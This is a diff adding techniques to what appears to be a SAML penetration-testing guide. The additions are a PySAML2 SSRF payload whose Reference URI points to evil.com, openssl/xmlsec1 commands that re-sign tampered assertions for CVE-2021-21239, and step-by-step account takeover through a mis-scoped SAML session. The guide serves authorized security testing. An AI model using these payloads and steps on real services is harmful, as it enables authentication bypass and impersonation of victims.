@@ -194,3 +194,32 @@ Some parsers use first, some use last.
 ## Summary
 
 SAML's XML complexity is its weakness. Signature wrapping exploits the gap between what is signed and what is processed. Always test signature removal, XSW variants, comment injection, and replay — production deployments frequently skip one of these checks.
+
+
+
+## Additional Techniques — ported from WebSkills (improper-authentication-testing)
+
+### PySAML2 SSRF via `ds:Reference URI`
+The URI in the `ds:Reference` node is resolved server-side; point it outbound to reach internal hosts (pysaml2 issue #510):
+```xml
+<ds:Reference URI="http://www.evil.com/uhoh?#id117178283225551701714676244">
+```
+
+### xmlsec1 embedded-key trust (CVE-2021-21239)
+Vulnerable `xmlsec1` trusts an *embedded* key instead of the SP's configured certificate — so you can re-sign a tampered assertion with your own key and it validates. Repro:
+```bash
+# strip ds:SignatureValue + ds:DigestValue, blank the ds:Reference URI, replace ds:x509Data,
+# remove stray whitespace/newlines, then sign with your own key:
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1000 -nodes
+xmlsec1 --sign --privkey-pem key.pem tampered.xml > signed.xml
+# vulnerable versions "verify" it even with an unrelated trusted cert:
+xmlsec1 --verify --trusted-pem other-cert.pem signed.xml
+```
+(pysaml2 advisory GHSA-5p3x-r448-pc62)
+
+### Mis-scoped SAML session → user impersonation / ATO
+Even with correct signature validation, a session can be scoped to the wrong org so it carries the *victim's* user_id:
+1. Sign into `target.com` as an org owner (attacker account) and configure your own SAML IdP (e.g. Okta) with user provisioning enabled.
+2. In your IdP, create a person with the **victim's email** and a password you set; assign them to the org app.
+3. IdP-initiated login into the org with victim-email + your password → `target.com` issues a session containing the victim's user_id but tied to your org.
+4. Hit endpoints that authorize on `user_id` (edit settings, read victim data) → impersonation/ATO. (0xoverlord writeup)
